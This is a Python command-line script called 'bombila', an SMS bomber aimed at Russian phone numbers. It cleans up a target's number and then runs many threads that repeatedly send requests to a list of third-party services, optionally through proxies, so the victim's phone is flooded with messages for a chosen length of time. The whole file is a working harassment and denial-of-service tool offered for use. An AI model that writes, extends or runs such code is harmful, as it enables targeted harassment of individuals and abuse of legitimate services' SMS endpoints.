#!/usr/bin/env python3

# TODO: country codes for other phone numbers, logging ( --verbose )

import os
import json
import argparse
import threading
from time import time, sleep
from itertools import cycle

try:
    from randomData import shuffleServices
    from service import Service
    import conf.config as cfg
except ImportError as e:
    print(e)
    exit("ImportError: try to install modules:\n" +
         "pip3 install -r requirements.txt")


def startBomber(thread_id):
    shuffleServices(services)
    for elem in cycle(services):
        if time() >= stop_time:
            return
        sleep(interval)
        # Creating obj of service, parse data, replace data and send request:
        service = Service(elem, timeout, proxy)
        service.parse_data()
        service.replace_data(phone)
        try:
            service._send_request()
        except KeyboardInterrupt:
            threading._shutdown()


def cleanPhoneFromTrash(phone):
    for trash in ["'", '"', "-", "_", "(", ")", " "]:
        if trash in phone:
            phone = phone.replace(trash, "")
    if phone[0] == '+':
        phone = phone[1::]
    if phone[0] == '8':
        phone = '7' + phone[1::]
    if phone[0] == '9':
        phone = '7' + phone
    return phone


# Creating parser obj
parser = argparse.ArgumentParser(
    description="Ultimate sms bomber - bombila. Russian numbers only",
    prog="bombila", epilog="Usage example: ./bomber.py -p 79877771122 -t 20")
# Optional args
parser.add_argument(
    "-p", "--phone", metavar="<phone>",
    help="target's russian phone number, format no matters")
parser.add_argument(
    "-t", "--stop_time", metavar="<seconds>",
    type=float, help="bombing time in seconds")
parser.add_argument(
    "--threads", default=50, type=int, metavar="<int>",
    help="threads count, more threads = more sms, (default: %(default)s)")
parser.add_argument(
    "-i", "--interval", default=0, type=float, metavar="<seconds>",
    help="intervals between requests in sec, (default: %(default)s)")
parser.add_argument(
    "-T", "--timeout", default=3, type=float, metavar="<seconds>",
    help="timeout for request in sec, (default: %(default)s)")
parser.add_argument(
    "--proxy", action="store_true", default=None,
    help="use proxy while bombing")
parser.add_argument(
    "-v", "--version", action="version",
    version="%(prog)s " + cfg.__version__)
args = parser.parse_args()

# Targets phone number
phone = args.phone
if not phone:
    phone = input("Enter target's phone number: ")
phone = cleanPhoneFromTrash(phone)
# Bombing time
if not args.stop_time:
    args.stop_time = int(input("Enter bombing time in seconds: "))
stop_time = args.stop_time + time()
# Other args
threads = args.threads
interval = args.interval
timeout = args.timeout
proxy = args.proxy
if proxy:
    proxy = cfg.proxies

with open("services.json", "r") as file:
    services = json.load(file)["services"]

os.system("clear")
print(cfg.banner)
print("Creating %s threads" % threads)
# Creating threads
for thread_id in range(threads):
    thread_id += 1
    threading.Thread(target=startBomber, args=(thread_id, )).start()

# Killing all threads when bombers work is done
threading._shutdown()
print('all done!!!')
